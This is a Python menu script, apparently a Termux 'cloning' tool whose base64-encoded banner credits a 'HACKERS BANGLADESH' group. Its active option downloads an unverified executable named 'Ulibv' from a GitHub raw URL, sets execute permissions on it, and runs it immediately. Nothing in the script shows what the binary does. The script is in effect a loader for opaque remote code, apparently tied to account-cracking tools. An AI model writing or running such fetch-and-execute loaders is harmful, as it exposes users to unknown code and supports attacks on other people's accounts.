import os
import base64,sys
import urllib.request
import stat
import subprocess

def download_and_run(url, file_name):
	if os.path.exists(file_name):
		print(f"{file_name} already exists. Running the existing file...")
	else:
		print(f"Downloading {file_name} from GitHub...")
		urllib.request.urlretrieve(url, file_name)
		print(f"Downloaded {file_name}")
		print(f"Setting execute permissions for {file_name}...")
		st = os.stat(file_name)
		os.chmod(file_name, st.st_mode | stat.S_IEXEC)

	print(f"Running {file_name}...")
	subprocess.run([f"./{file_name}"])
def clear():
	os.system('clear')
def minex():
	print('\033[1;92m════════════════════════════════════════')
def read_file_and_encode(filename):
	with open(filename, 'rb') as file:
		encoded_content = base64.b64encode(file.read()).decode('utf-8')
	return encoded_content

def decode_content(encoded_content):
	decoded_content = base64.b64decode(encoded_content).decode('utf-8')
	return decoded_content

def banner():
	clear()
	encoded_file_content = "CgogG1sxOzkybSAgICBfICAgICAgICAgIF8KG1sxOzkybSAgICAgXCAgICAgICAgLwobWzE7OTJtICAgIF9fXF9fX19fXy8KG1sxOzkybSAgICB8IFsbWzE7MzE7MW3CqRtbMTs5Mm1dICBbG1sxOzMxOzFtwqkbWzE7OTJtXSB84oCLCiAbWzE7OTJtICAgfCAgWxtbMTszM209PT09G1sxOzkybV0gIHwgWytdIEhBQ0tFUlMgQkFOR0xBREVTSCBbK10KG1sxOzkybeKVlOKVkOKVkG8wMOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkDAwb+KVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwobWzE7MzE7MW3iloggG1sxOzkybSBb4oCiXSAbWzE7MzE7MW1BdXRob3IgICAgOiAgG1sxOzkybSBKYW1lczQwNF8gICAgICAgICAgIBtbMTszMTsxbSDilogKG1sxOzMxOzFt4paIIBtbMTs5Mm0gW+KAol0gG1sxOzMxOzFtV2hhdHNhcHAgIDogIBtbMTs5Mm0gQmxhY2sgR29sZCAgICAgICAgICAbWzE7MzE7MW0g4paIChtbMTszMTsxbeKWiCAbWzE7OTJtIFvigKJdIBtbMTszMTsxbVdoYXRzYXBwICA6IBtbMTs5Mm0gIEJsYWNrNDA0XyAgICAgICAgICAgG1sxOzMxOzFtIOKWiAobWzE7MzE7MW3iloggG1sxOzkybSBb4oCiXSAbWzE7MzE7MW1Hb3J1cCBGYiAgOiAgG1sxOzkybSBUZXJtdXggQ29tbWFuZCBXb3JsZBtbMTszMTsxbSDilogKG1sxOzMxOzFt4paIIBtbMTs5Mm0gW+KAol0gG1sxOzMxOzFtVmVyc2lvbiAgIDogIBtbMTs5Mm0gMC4xMSAgICAgICAgICAgICAgICAgG1sxOzMxOzFt4paIChtbMTs5Mm3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0="  # Replace with your encoded file content
	decoded_file_content = decode_content(encoded_file_content)
	print(decoded_file_content)
	minex()
	print('\033[1;92m👉 WE SUPPORT PALESTINIANS,SAFE PALESTINIANS')


def menu():
	banner()
	minex()
	print("Select an option for cloning:")
	minex()
	print("1: Install File Cloning-1 (Active)")
	print("2: Install File Cloning-2 (Ofline)")
	print("3: Install File Cloning-3 (Ofline)")
	print("3: Exit")
	minex()
	choice = input("Enter your choice (1-3): ")

	if choice == '1':
		url = "https://raw.githubusercontent.com/James404-cyber/Engage/refs/heads/main/Ulibv"
		file_name = "Ulibv"
		download_and_run(url, file_name)
	elif choice == '2':
#		url = "https://raw.githubusercontent.com/James404-cyber/Engage/refs/heads/main/OtherFile"  # Replace with actual link
#		file_name = "Ulibv2"
#		download_and_run(url, file_name)
		print("Exiting...")
	elif choice == '3':
		print("Exiting...")
		exit()
	else:
		print("Invalid choice. Please try again.")
		menu()

if __name__ == "__main__":
	menu()
